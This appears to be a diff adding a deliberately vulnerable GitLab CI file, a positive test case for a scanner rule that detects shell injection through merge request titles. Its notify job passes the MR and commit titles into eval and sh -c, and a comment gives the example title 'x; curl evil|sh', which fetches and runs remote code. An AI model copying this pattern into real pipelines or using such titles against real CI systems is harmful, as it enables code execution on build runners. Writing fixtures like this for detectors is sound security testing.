@@ -1,0 +1,15 @@
+# corpus: positive
+# models: MR metadata spliced into a command where the shell re-parses it
+#   (eval / sh -c), so an MR title like `x; curl evil|sh` executes.
+# expect: cicd-sec-4-gl-shell-injection
+stages: [notify]
+
+notify:
+  stage: notify
+  image: alpine:3.20
+  timeout: 5m
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+  script:
+    - eval "echo Building MR -- $CI_MERGE_REQUEST_TITLE"
+    - sh -c "git log -1 --format=%s | grep -q '${CI_COMMIT_TITLE}'"
